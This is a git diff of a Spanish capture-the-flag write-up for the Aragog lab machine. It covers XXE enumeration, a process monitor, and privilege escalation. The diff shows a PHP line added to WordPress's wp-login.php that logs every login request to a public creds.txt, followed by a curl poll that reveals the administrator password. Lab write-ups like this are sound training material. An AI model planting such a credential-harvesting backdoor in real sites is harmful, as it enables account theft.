@@ -1,4 +1,7 @@
 10.10.10.78 - Aragog
+
+![Aragog](https://user-images.githubusercontent.com/96772264/202145480-9702eaac-406b-4a76-a143-176ff3f6b875.png)
+
 --------------------
 
 # Part 1: Enumeración
@@ -33,8 +36,12 @@ ftp> exit
 -------------------------------
 
 # Part 2: XXE
+La página original es sitio por defecto de apache:
+![aragog1](https://user-images.githubusercontent.com/96772264/202145591-d5e35542-8173-4bf1-8371-28d15c27570a.PNG)
 
-La página nos dice que hay tales posibles hosts para una red (no nos dice cual). 
+La ruta /hosts.php nos dice que hay tales posibles hosts para una red (no nos dice cual).
+![aragog2](https://user-images.githubusercontent.com/96772264/202145656-415fb445-c649-4c47-9a36-51db24520c7c.PNG)
+
 Si probamos a darle el archivo que nos descargamos:
 ```console
 └─$ curl -s -X POST http://aragog.htb/hosts.php -d @test.txt
@@ -105,8 +112,7 @@ florian@aragog:~$
 
 # Part 4: Explotación de wordpress
 
-Ya tenemos la user.txt con él, para escalar privilegios tiramos de nuestro script de reconocimiento, pero como
-con él no encuentro nada, tiraré del de monitoreo.
+Ya tenemos la user.txt con él, para escalar privilegios tiramos de nuestro script de reconocimiento, pero como con él no encuentro nada, tiraré del de [monitoreo](https://github.com/CUCUxii/Pentesting-tools/blob/main/procmon.sh).
 ```console
 florian@aragog:/tmp$ ./procmon.sh
 > /usr/sbin/CRON -f
@@ -141,21 +147,22 @@ Administrator | $P$B3FUuIdSDW0IaIc4vsjj.NzJDkiscu. | it@megacorp.com
 ```
 
 Sería la clave un rabbit hole porque no se pudo romper con el jhon.
-
 En la ruta /var/www/html se guarda el codigo fuente de la web que se está ofreciendo por el servidor
 ```console
 florian@aragog:/var/www/html$ ls
 dev_wiki  hosts.php  index.html  zz_backup
 ```
-Como vemos hay una ruta nueva llamada dev_wiki (es un directorio)
+Como vemos hay una ruta nueva llamada dev_wiki (es un directorio con cosas de wordpress). O sea hay otra página de wordpress **aragog.htb/dev_wiki**
 
-En **./wp-login.php**, ponemos al principio
+![aragog3](https://user-images.githubusercontent.com/96772264/202146138-9e7b6e30-bb3c-4af5-996e-553f10828540.PNG)
+
+Si se están tratando de autenticar con el script de python de cliff /home/cliff/wp-login.py, podriamos pillar esa autenticción modificando el archivo 
+ **./wp-login.php**, poninedo al principio:
 ```php
 <?php
 file_put_contents("/var/www/html/creds.txt" ,$_REQUEST, FILE_APPEND);
 ```
-Hacemos un ```watch -n 1 curl -s http://aragog.htb/creds.txt``` y obtenemos las creds:
-Administrator:!KRgYs(JFO!&MTr)lf
+Hacemos un ```watch -n 1 curl -s http://aragog.htb/creds.txt``` y obtenemos las creds: *Administrator:!KRgYs(JFO!&MTr)lf*
 ```console
 min/1florian@aragog:/var/www/html/dev_wiki$ su 
 Password: 
@@ -164,7 +171,7 @@ root@aragog:~# cat root.txt
 
 -------------------------------
 
-# Extra: Script en php hosts.php
+# Extra: Script en php hosts.php, subneteo.
 
 ```php
 <?php
